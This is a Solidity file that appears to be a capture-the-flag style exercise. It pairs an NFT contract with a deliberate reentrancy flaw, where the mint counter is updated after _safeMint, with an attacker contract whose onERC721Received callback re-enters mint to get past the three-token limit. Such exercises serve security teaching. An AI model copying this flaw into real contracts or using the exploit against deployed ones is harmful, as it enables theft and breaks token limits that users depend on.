// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract Overmint1 is ERC721 {
    using Address for address;
    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint1", "AT") {}

    function mint() external {
        require(amountMinted[msg.sender] <= 3, "max 3 NFTs");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }

    function success(address _attacker) external view returns (bool) {
        return balanceOf(_attacker) == 5;
    }
}

contract Overmint1Attacker {
    Overmint1 public victim;
    address attacker;

    constructor(address victimContract) {
        victim = Overmint1(victimContract);
        attacker = msg.sender;
    }

    function attack() external {
        victim.mint();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        require(msg.sender == address(victim), "not victim");

        victim.transferFrom(address(this), attacker, tokenId);
        if (victim.balanceOf(attacker) < 5) {
            victim.mint();
        }

        return this.onERC721Received.selector;
    }
}
